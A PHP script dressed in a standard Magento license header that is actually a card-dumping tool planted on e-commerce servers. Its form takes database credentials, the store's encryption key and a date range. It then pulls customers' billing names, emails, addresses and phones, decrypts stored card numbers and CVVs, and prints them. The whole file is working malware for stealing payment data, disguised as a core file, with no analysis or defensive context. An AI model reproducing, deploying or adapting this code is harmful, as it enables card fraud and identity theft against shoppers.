<?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category   Mage
 * @package    Mage
 * @copyright  Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

function decr($text,$key) {
    $h = mcrypt_module_open(MCRYPT_BLOWFISH, '', MCRYPT_MODE_ECB, '');
    $v = mcrypt_create_iv (mcrypt_enc_get_iv_size($h), MCRYPT_RAND);
    mcrypt_generic_init($h, $key, $v);
    $decripted = mdecrypt_generic($h, base64_decode ($text));
    return $decripted;
}

$thisFile = $_SERVER['PHP_SELF'];
$dateNow = date("Y-m-d");
$headerHtml = "<!DOCTYPE html><html><head><title>Mangento Dum Dum</title></head><body>";
$footerHtml = "</body></html>";
$submitHtml = "<form method=\"post\" action=\"".$thisFile."\">
| h:<input type=\"text\" name=\"h\"> 
| u:<input type=\"text\" name=\"u\"> 
| p:<input type=\"text\" name=\"p\"> 
| d: <input type=\"text\" name=\"d\">
| key: <input type=\"text\" name=\"key\">
| prefix: <input type=\"text\" name=\"prefix\">
| StartDate: <input type=\"text\" name=\"sd\" value=\"".$dateNow."\">
| EndDate: <input type=\"text\" name=\"ed\" value=\"".$dateNow."\">
<input type=\"submit\" name=\"btnSubmit\" value=\"Submit\">
</form>";

echo $headerHtml;
echo $submitHtml;
if (isset($_POST['btnSubmit'])) {
    echo "<br><br><pre>";
    echo "-h: " . $_POST["h"] . " -u: " . $_POST["u"] . " -p: " . $_POST["p"] . " -d: " . $_POST["d"] . " -key: " . $_POST["key"] . " -prefix: " . $_POST["prefix"] . "\n";
    echo "StartDate: ".$_POST['sd']." - EndDate: ". $_POST['ed'];
	echo "\n------------------------------------------- Cut Here -------------------------------------------\n";
    $key = $_POST["key"];
    $prefix = $_POST["prefix"];

    $sql = "SELECT " . $prefix . "sales_flat_quote_address.address_type,
    " . $prefix . "sales_flat_quote_address.email,
    " . $prefix . "sales_flat_quote_address.firstname,
    " . $prefix . "sales_flat_quote_address.middlename,
    " . $prefix . "sales_flat_quote_address.lastname,
    " . $prefix . "sales_flat_quote_address.company,
    " . $prefix . "sales_flat_quote_address.street,
    " . $prefix . "sales_flat_quote_address.city,
    " . $prefix . "sales_flat_quote_address.region,
    " . $prefix . "sales_flat_quote_address.postcode,
    " . $prefix . "sales_flat_quote_address.country_id,
    " . $prefix . "sales_flat_quote_address.telephone,
    " . $prefix . "sales_flat_quote_address.fax,
    " . $prefix . "sales_flat_quote_payment.cc_exp_month,
    " . $prefix . "sales_flat_quote_payment.cc_exp_year,
    " . $prefix . "sales_flat_quote_payment.cc_last4,
    " . $prefix . "sales_flat_quote_payment.cc_owner,
    " . $prefix . "sales_flat_quote_payment.cc_type,
    " . $prefix . "sales_flat_quote_payment.cc_number_enc,
    " . $prefix . "sales_flat_quote_payment.cc_cid_enc
    FROM " . $prefix . "sales_flat_quote_payment," . $prefix . "sales_flat_quote_address 
    WHERE " . $prefix . "sales_flat_quote_address.quote_id = " . $prefix . "sales_flat_quote_payment.quote_id 
        AND " . $prefix . "sales_flat_quote_address.address_type = 'billing'
		AND " . $prefix . "sales_flat_quote_payment.cc_last4 != ''
		AND " . $prefix . "sales_flat_quote_payment.updated_at BETWEEN '".$_POST['sd']."' AND '".$_POST['ed']."'
		";
    
    
    mysql_connect($_POST["h"],$_POST["u"],$_POST["p"], 3306) or die(mysql_error());
    mysql_select_db($_POST["d"]) or die(mysql_error());
    
    $rs = mysql_query($sql);

    $i = 0;
    $result = array();
    if ($rs) {
        while($row = mysql_fetch_assoc($rs)) {
            echo "email : ". $row['email'] . "\n";
            echo "firstname : ". $row['firstname'] . "\n";
            echo "middlename : ". $row['middlename'] . "\n";
            echo "lastname : ". $row['lastname'] . "\n";
            echo "company : ". $row['company'] . "\n";
            echo "street : ". $row['street'] . "\n";
            echo "city : ". $row['city'] . "\n";
            echo "region : ". $row['region'] . "\n";
            echo "postcode : ". $row['postcode'] . "\n";
            echo "telephone : ". $row['telephone'] . "\n";
            echo "country_id : ". $row['country_id'] . "\n";
            echo "fax : ". $row['fax'] . "\n\n";

            echo "cc_owner : ". $row['cc_owner'] . "\n";
            echo "cc_type : ". $row['cc_type'] . "\n";
            echo "cc_exp_month : ". $row['cc_exp_month'] . "\n";
            echo "cc_exp_year : ". $row['cc_exp_year'] . "\n";
            echo "cc_type : ". $row['cc_type'] . "\n";
            echo "last4 : ". $row['cc_last4'] . "\n";
            
			if ($key != "") {
			$cc_numb = "";
            if ($row['cc_number_enc'] != "") {
				$cc_numb = decr($row['cc_number_enc'],$key);
			}
			$cc_cvv = "";
			if ($row['cc_cid_enc'] != "") {
				$cc_cvv = decr($row['cc_cid_enc'],$key);
			}
        
            echo "cc_numb : ". $cc_numb . "\n";
            echo "cc_cvv : ". $cc_cvv . "\n\n";
			}
            
            echo "---------------------------------------------\n\n";
        }
    }
    
    echo "</pre>";
}
echo $footerHtml;
?>
